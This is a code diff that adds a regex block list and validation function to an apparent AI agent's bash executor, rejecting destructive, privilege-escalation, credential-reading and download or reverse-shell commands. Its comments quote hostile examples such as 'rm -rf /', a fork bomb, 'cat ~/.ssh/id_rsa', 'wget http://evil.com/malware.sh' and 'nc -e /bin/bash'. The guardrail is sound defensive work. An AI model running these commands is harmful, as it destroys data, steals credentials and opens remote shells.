@@ -81,6 +81,112 @@ class IterativeAgentConfig:
     max_output_length: int = 10000
 
 
+# Dangerous command patterns that should be blocked for security.
+# Each tuple contains (compiled_regex, error_message).
+DANGEROUS_PATTERNS: list[tuple[re.Pattern, str]] = [
+    # ===== Destructive system commands =====
+    # Examples: "rm -rf /", "rm -rf ~", "rm -fr /"
+    (re.compile(r'\brm\s+(-[^\s]*\s+)*[/~](\s|$)'),
+     "Deleting root or home directory is not allowed"),
+
+    # Examples: "rm -rf ..", "rm -rf ../important"
+    (re.compile(r'\brm\s+(-[^\s]*\s+)*\.\.'),
+     "Deleting parent directory is not allowed"),
+
+    # Examples: "rm -rf *", "rm -rf ./*"
+    (re.compile(r'\brm\s+(-[^\s]*\s+)*\*'),
+     "Wildcard deletion is not allowed"),
+
+    # Examples: "> /dev/sda", "echo x > /dev/mem" (allows /dev/null)
+    (re.compile(r'>\s*/dev/(?!null)'),
+     "Writing to device files is not allowed"),
+
+    # Examples: "mkfs.ext4 /dev/sda", "mkfs -t ext4 /dev/sda1"
+    (re.compile(r'\bmkfs\b'),
+     "Formatting disks is not allowed"),
+
+    # Examples: "fdisk /dev/sda", "fdisk -l /dev/nvme0n1"
+    (re.compile(r'\bfdisk\b'),
+     "Disk partitioning is not allowed"),
+
+    # Examples: "dd if=/dev/zero of=/dev/sda", "dd of=/dev/nvme0n1"
+    (re.compile(r'\bdd\s+.*\bof=/dev/'),
+     "Writing to devices with dd is not allowed"),
+
+    # Examples: "dd if=/dev/sda of=disk.img" (reading sensitive disk data)
+    (re.compile(r'\bdd\s+.*\bif=/dev/'),
+     "Reading from devices with dd is not allowed"),
+
+    # Fork bomb: :(){ :|:& };:
+    (re.compile(r':\(\)\s*\{\s*:\|:&\s*\}\s*;:'),
+     "Fork bomb detected"),
+
+    # ===== Privilege escalation =====
+    # Examples: "sudo rm -rf /", "echo pwd | sudo -S cmd", "/usr/bin/sudo cmd"
+    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?sudo\b'),
+     "sudo is not allowed"),
+
+    # Examples: "doas rm file", "/usr/bin/doas cmd"
+    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?doas\b'),
+     "doas is not allowed"),
+
+    # Examples: "pkexec rm file", "pkexec /bin/bash"
+    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?pkexec\b'),
+     "pkexec is not allowed"),
+
+    # Examples: "su root", "su - admin", "su -c 'command' user"
+    (re.compile(r'(?:^|[;&|`]\s*)su\s+(-[^\s]*\s+)*\w'),
+     "su is not allowed"),
+
+    # Examples: "chmod 777 /", "chmod -R 0777 /var"
+    (re.compile(r'\bchmod\s+[0-7]*777\b'),
+     "Setting 777 permissions is not allowed"),
+
+    # Examples: "chown root file", "chown root:root /etc/passwd"
+    (re.compile(r'\bchown\s+root\b'),
+     "Changing ownership to root is not allowed"),
+
+    # ===== Sensitive file access =====
+    # Examples: "cat /etc/shadow", "> /etc/passwd", "< /etc/sudoers"
+    (re.compile(r'[<>]\s*/etc/(?:passwd|shadow|sudoers)'),
+     "Accessing sensitive system files is not allowed"),
+
+    # Examples: "cat ~/.ssh/id_rsa", "cat /home/user/.aws/credentials"
+    (re.compile(r'\bcat\s+.*/(?:\.ssh/|\.aws/|\.env\b)'),
+     "Reading sensitive credential files is not allowed"),
+
+    # ===== Arbitrary code download and network exfiltration =====
+    # Examples: "wget http://evil.com/malware.sh", "wget https://x.com/script"
+    (re.compile(r'\bwget\s+.*https?://'),
+     "Downloading from URLs with wget is not allowed"),
+
+    # Examples: "curl http://evil.com/script.sh", "curl -O https://..."
+    (re.compile(r'\bcurl\s+.*https?://'),
+     "Downloading from URLs with curl is not allowed"),
+
+    # Examples: "nc -e /bin/bash 10.0.0.1 4444", "ncat -e cmd attacker.com"
+    (re.compile(r'\b(?:nc|ncat|netcat)\b.*\s-[^\s]*e'),
+     "Netcat reverse shell is not allowed"),
+]
+
+
+def validate_command(command: str) -> tuple[bool, str]:
+    """Validate that a command is safe to execute.
+
+    Args:
+        command: The bash command string to validate.
+
+    Returns:
+        A tuple of (is_valid, error_message).
+        is_valid is True if the command passes all safety checks.
+        error_message is empty string if valid, otherwise describes the violation.
+    """
+    for pattern, message in DANGEROUS_PATTERNS:
+        if pattern.search(command):
+            return False, message
+    return True, ""
+
+
 class IterativeAgent:
     """Iterative agent that executes commands step-by-step."""
 
@@ -372,6 +478,11 @@ You cannot continue working (reading, editing, testing) in any way on this task 
             raise FormatError(error_msg)
 
         command = matches[0].strip()
+
+        # Validate command for security before execution
+        is_valid, error_msg = validate_command(command)
+        if not is_valid:
+            raise FormatError(f"Command blocked for security: {error_msg}")
 
         # Execute command using asyncio.to_thread to avoid blocking
         def run_cmd():
